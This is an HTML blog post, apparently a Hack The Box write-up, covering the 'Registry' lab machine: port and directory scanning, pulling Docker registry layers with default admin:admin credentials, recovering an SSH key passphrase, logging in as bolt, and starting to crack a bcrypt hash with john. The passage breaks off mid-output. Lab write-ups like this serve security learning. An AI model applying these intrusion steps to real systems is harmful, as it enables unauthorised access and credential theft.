@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Registry - gr4n173</title><meta name="Description" content="Here I will explain my path for Registry box from Hack The Box."><meta property="og:title" content="Registry" />
+<meta property="og:description" content="Here I will explain my path for Registry box from Hack The Box." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.com/registery/" />
+<meta property="og:image" content="http://example.com/registery/featured-image.png"/>
+<meta property="article:published_time" content="2020-04-04T17:55:28+08:00" />
+<meta property="article:modified_time" content="2020-05-01T17:55:28+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.com/registery/featured-image.png"/>
+<meta name="twitter:title" content="Registry"/>
+<meta name="twitter:description" content="Here I will explain my path for Registry box from Hack The Box."/>
+<meta name="application-name" content="gr4n173">
+<meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/registery/" /><link rel="next" href="http://example.com/moee-1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Registry",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.com\/registery\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/example.com\/registery\/featured-image.png",
+                            "width":  743 ,
+                            "height":  223 
+                        }],"genre": "posts","keywords": "htb, linux, boltcms, restic-server, port-forward","wordcount":  1971 ,
+        "url": "http:\/\/example.com\/registery\/","datePublished": "2020-04-04T17:55:28+08:00","dateModified": "2020-05-01T17:55:28+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/example.com\/images\/profile.jpg",
+                    "width":  400 ,
+                    "height":  400 
+                }},"author": {
+                "@type": "Person",
+                "name": "gr4n173"
+            },"description": "Here I will explain my path for Registry box from Hack The Box."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Registry</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/gr4n173" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw"></i>Hack The Box</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-04-04">2020-04-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1971 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/registery/featured-image.png"
+        data-srcset="/registery/featured-image.png, /registery/featured-image.png 1.5x, /registery/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/registery/featured-image.png"
+        title="Here I will explain my path for Registry box from Hack The Box." /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#htbregistry">HTB:Registry</a></li>
+    <li><a href="#box-details">Box Details</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a>
+      <ul>
+        <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+        <li><a href="#docker-registry-exploit">Docker Registry Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#to-root">To Root</a>
+      <ul>
+        <li><a href="#web-enumeration-1">Web Enumeration</a></li>
+        <li><a href="#unprivileged-user">Unprivileged User</a>
+          <ul>
+            <li><a href="#restic-server">Restic Server</a></li>
+            <li><a href="#port-forwarding">Port Forwarding</a></li>
+          </ul>
+        </li>
+        <li><a href="#rest-server-backup-files">Rest-Server Backup Files</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><code>Registry</code> box was the hard box. It falls under linux and hard category.Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box.</p>
+<h2 id="htbregistry">HTB:Registry</h2>
+<p>Registry box was the hard box. It falls under linux and hard category. Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting the docker registry page where I got the <code>id_rsa</code> key and <code>password</code>. For root, I got the <code>www-data</code> shell by exploiting <code>CSRF TO RCE</code> then with that shell I downloaded the backups files with restic-service and got a <code>root.txt</code>. I’ll show all my payload(including that didn’t work in initial deployment to get the root).</p>
+<h2 id="box-details">Box Details</h2>
+<p><figure><a class="lightgallery" href="/registery/public/images/registry_detail.png" title="Details of Registry Box" data-thumbnail="/registery/public/images/registry_detail.png" data-sub-html="<h2>Details of Registry Box</h2><p>Details of Registry Box</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="public/images/registry_detail.png"
+            data-srcset="/registery/public/images/registry_detail.png, public/images/registry_detail.png 1.5x, /registery/public/images/registry_detail.png 2x"
+            data-sizes="auto"
+            alt="/registery/public/images/registry_detail.png" />
+    </a><figcaption class="image-caption">Details of Registry Box</figcaption>
+    </figure></p>
+<p>In the above picture it&rsquo;s IP was <code>10.10.10.159</code> and added it to <code>/etc/hosts</code> as registry.htb. Let&rsquo;s solve this box.</p>
+<hr>
+<h2 id="recon">Recon</h2>
+<p>Let&rsquo;s start with our universal port scanner, <code>nmap</code> to see the open port and which shows port <code>SSH(22)</code>, <code>HTTP(TCP 80)</code> and <code>SSL(TCP 443)</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159
+<span class="c1"># Nmap 7.80 scan initiated Thu Oct 24 22:03:45 2019 as: nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159</span>
+Nmap scan report <span class="k">for</span> 10.10.10.159
+Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
+Not shown: <span class="m">997</span> closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Welcome to nginx!
+443/tcp open  ssl/http nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Welcome to nginx!
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>docker.registry.htb
+<span class="p">|</span> Not valid before: 2019-05-06T21:14:35
+<span class="p">|</span>_Not valid after:  2029-05-03T21:14:35
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="c1"># Nmap done at Thu Oct 24 22:04:44 2019 -- 1 IP address (1 host up) scanned in 58.92 seconds</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="web-enumeration">Web Enumeration</h2>
+<p><strong>registry.htb</strong></p>
+<p>As soon as I saw port 80 opened I visited the site and got below as output.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/registry_web.jpg"
+        data-srcset="/registery/public/images/registry_web.jpg, public/images/registry_web.jpg 1.5x, /registery/public/images/registry_web.jpg 2x"
+        data-sizes="auto"
+        alt="/registery/public/images/registry_web.jpg"
+        title="Registry Website" /></p>
+<p>Now as usual for website I we usually searched for dir so I searched  <code>dirsearch</code> tool as .</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ./dirsearch.py -e html,txt,php,pcap,tar,bzip -u http://registry.htb/ -w ~/Downloads/wo
+rdlists/SecLists/Discovery/Web-Content/raft-large-directories.txt 
+
+ _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.3.8
+<span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
+
+Extensions: html, txt, php, pcap, tar, bzip <span class="p">|</span> Threads: <span class="m">10</span> <span class="p">|</span> Wordlist size: <span class="m">62279</span>
+
+Error Log: /home/bikram/bbek/recon_tool/dirsearch/logs/errors-20-04-02_20-42-51.log
+
+Target: http://registry.htb/
+
+<span class="o">[</span>20:42:51<span class="o">]</span> Starting: 
+<span class="o">[</span>20:42:54<span class="o">]</span> <span class="m">301</span> -  194B  - /install  -&gt;  http://registry.htb/install/
+<span class="o">[</span>20:46:22<span class="o">]</span> <span class="m">200</span> -  612B  - /bolt 
+
+Task Completed
+
+</code></pre></td></tr></table>
+</div>
+</div><p>and got the dir <code>/bolt</code> and <code>/install</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/registy_bolt.jpg"
+        data-srcset="/registery/public/images/registy_bolt.jpg, public/images/registy_bolt.jpg 1.5x, /registery/public/images/registy_bolt.jpg 2x"
+        data-sizes="auto"
+        alt="/registery/public/images/registy_bolt.jpg"
+        title="bolt" /></p>
+<p>Fig: <code>/bolt</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/registry_install.jpg"
+        data-srcset="/registery/public/images/registry_install.jpg, public/images/registry_install.jpg 1.5x, /registery/public/images/registry_install.jpg 2x"
+        data-sizes="auto"
+        alt="/registery/public/images/registry_install.jpg"
+        title="install" /></p>
+<p>Fig: <code>/install</code></p>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+<p>As the given was <code>http</code> but looked over <code>https</code> too. In order to find the interesting things I usually use <code>nikto</code> tool. So I used it here too and got the subdomain as <code>docker.registry.htb</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ nikto -h https://10.10.10.159                                                                             
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.159
++ Target Hostname:    10.10.10.159
++ Target Port:        <span class="m">443</span>
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN<span class="o">=</span>docker.registry.htb
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /CN<span class="o">=</span>Registry
++ Start Time:         2020-04-02 21:44:11 <span class="o">(</span>GMT5.75<span class="o">)</span>
+---------------------------------------------------------------------------
++ Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and Expect-CT header is not present.
++ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ Hostname <span class="s1">&#39;10.10.10.159&#39;</span> does not match certificate<span class="err">&#39;</span>s names: docker.registry.htb
++ The Content-Encoding header is <span class="nb">set</span> to <span class="s2">&#34;deflate&#34;</span> this may mean that the server is vulnerable to the BREACH attack.
++ OSVDB-3092: /install/: This might be interesting...
++ <span class="m">7876</span> requests: <span class="m">8</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">5</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2020-04-03 00:49:25 <span class="o">(</span>GMT5.75<span class="o">)</span> <span class="o">(</span><span class="m">11114</span> seconds<span class="o">)</span>
+---------------------------------------------------------------------------
++ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="docker-registry-exploit">Docker Registry Exploit</h3>
+<p>Then I found the dir with dirsearch as <code>http://docker.registry.htb/v2/</code> and able to login with creds <code>admin:admin</code>. So I googled about it and found the interesting blog which explain how can we exploit the docker registry to download the stored files. You can find it <a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry" target="_blank" rel="noopener noreffer">here</a>.</p>
+<p>Then I used this blog to exploit the docker registry and downloaded the file as</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ curl --user <span class="s2">&#34;admin:admin&#34;</span> http://docker.registry.htb/v2/bolt-image/manifests/latest                <span class="o">[</span>80/311<span class="o">]</span>
+<span class="o">{</span>                                                                                                                                                     
+   <span class="s2">&#34;schemaVersion&#34;</span>: 1,                                                                                                                                
+   <span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;bolt-image&#34;</span>,                                                                                                                              
+   <span class="s2">&#34;tag&#34;</span>: <span class="s2">&#34;latest&#34;</span>,                                                                                                                                   
+   <span class="s2">&#34;architecture&#34;</span>: <span class="s2">&#34;amd64&#34;</span>,                                                                                                                           
+   <span class="s2">&#34;fsLayers&#34;</span>: <span class="o">[</span>                                                                                                                                      
+      <span class="o">{</span>                                                                                                                                               
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&#34;</span>                                                         
+      <span class="o">}</span>,                                                                                                                                              
+      <span class="o">{</span>                                                                                                                                               
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&#34;</span>                                                         
+      <span class="o">}</span>,                                                                                                                                              
+      <span class="o">{</span>                                                                                                                                               
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&#34;</span>                                                         
+      <span class="o">}</span>,                                                                                                                                              
+      <span class="o">{</span>                                                                                                                                               
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&#34;</span>                                                         
+      <span class="o">}</span>,                                                                                                                                              
+      <span class="o">{</span>                                                                                                                                               
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&#34;</span>                                                         
+      <span class="o">}</span>,                                                                                                                                              
+      <span class="o">{</span>
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&#34;</span>
+      <span class="o">}</span>,
+      <span class="o">{</span>
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&#34;</span>
+      <span class="o">}</span>,
+      <span class="o">{</span>
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&#34;</span>
+      <span class="o">}</span>,
+      <span class="o">{</span>
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&#34;</span>
+      <span class="o">}</span>,
+      <span class="o">{</span>
+         <span class="s2">&#34;blobSum&#34;</span>: <span class="s2">&#34;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&#34;</span>
+      <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>From above I saw the files name which start with <code>sha256</code> and downloaded to my local machine as zip file and unzipped it. After all I found interesting folder name with file <code>01-ssh.ssh</code>  <code>sha256_302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</code> and got this as output.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/expect -f
+</span><span class="cp"></span><span class="c1">#eval `ssh-agent -s`</span>
+spawn ssh-add /root/.ssh/id_rsa
+expect <span class="s2">&#34;Enter passphrase for /root/.ssh/id_rsa:&#34;</span>
+send <span class="s2">&#34;GkOcz221Ftb3ugog\n&#34;</span><span class="p">;</span>
+expect <span class="s2">&#34;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&#34;</span>
+interact
+</code></pre></td></tr></table>
+</div>
+</div><p>this way I got the <code>passphraase</code> and <code>id_rsa</code> and able to ssh in as bolt.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ssh -i id_rsa bolt@registry.htb
+The authenticity of host <span class="s1">&#39;registry.htb (10.10.10.159)&#39;</span> can<span class="s1">&#39;t be established.
+</span><span class="s1">ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
+</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="s1">Warning: Permanently added &#39;</span>registry.htb<span class="s1">&#39; (ECDSA) to the list of known hosts.
+</span><span class="s1">Enter passphrase for key &#39;</span>id_rsa<span class="err">&#39;</span>: 
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-65-generic x86_64<span class="o">)</span>
+
+  System information as of Fri Apr  <span class="m">3</span> 07:54:40 UTC <span class="m">2020</span>
+
+  System load:  0.0               Users logged in:                <span class="m">1</span>
+  Usage of /:   6.1% of 61.80GB   IP address <span class="k">for</span> eth0:            10.10.10.159
+  Memory usage: 49%               IP address <span class="k">for</span> docker0:         172.17.0.1
+  Swap usage:   0%                IP address <span class="k">for</span> br-1bad9bd75d17: 172.18.0.1
+  Processes:    <span class="m">157</span>
+Last login: Fri Apr  <span class="m">3</span> 06:36:39 <span class="m">2020</span> from 10.10.14.18
+bolt@bolt:~$ whoami
+bolt
+bolt@bolt:~$ cat user.txt
+ytc0yt***************
+</code></pre></td></tr></table>
+</div>
+</div><p>This way I got the user <code>bolt</code>.</p>
+<h2 id="to-root">To Root</h2>
+<h3 id="web-enumeration-1">Web Enumeration</h3>
+<p>After a lot of dir search with different wordlist I finally got the login page of <code>bolt</code> cms site as.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/bolt_login.jpg"
+        data-srcset="/registery/public/images/bolt_login.jpg, public/images/bolt_login.jpg 1.5x, /registery/public/images/bolt_login.jpg 2x"
+        data-sizes="auto"
+        alt="/registery/public/images/bolt_login.jpg"
+        title="bolt_login" /></p>
+<p>Fig: Login Page</p>
+<p>then I searched everypart of the bolt shell and got the hash in dir <em>/var/www/html/app/database/bolt.db</em> and on <code>cat</code> I got the hash <em>$2y$10$e.ChUytg9SrL7AsboF2bX .wWKQ1LkS5Fi/Z0yYD86.P5E9cpY7P</em>. Now I used <code>john</code> to crack the hash and got the password <code>strawberry</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ john <span class="nb">hash</span> -wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> bikram: 
+Using default input encoding: UTF-8
+Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
